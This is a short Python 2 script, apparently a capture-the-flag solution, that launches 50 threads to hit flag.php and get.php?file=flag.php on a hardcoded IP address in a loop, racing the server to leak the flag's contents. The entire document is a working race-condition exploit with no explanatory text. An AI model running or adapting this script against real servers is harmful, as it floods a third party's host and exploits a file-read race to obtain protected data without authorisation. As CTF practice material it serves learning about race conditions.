import requests
import threading
import os

class RaceCondition(threading.Thread):
  def __init__(self):
    threading.Thread.__init__(self)
    self.url = 'http://49.4.68.67:91/flag.php'
    self.uploadUrl = 'http://49.4.68.67:91/get.php?file=flag.php'

  def _get(self):
    r = requests.get(self.url)
    print r.text

  def _upload(self):
    r = requests.get(self.uploadUrl)
    if len(r.text) != 0:
      print r.text
      os._exit(0)

  def run(self):
    while True:
      for i in range(5):
        self._get()

      for i in range(10):
        self._upload()
        self._get()

if __name__ == '__main__':
  threads = 50    

  for i in range(threads):
    t = RaceCondition()
    t.start()

  for i in range(threads):
    t.join()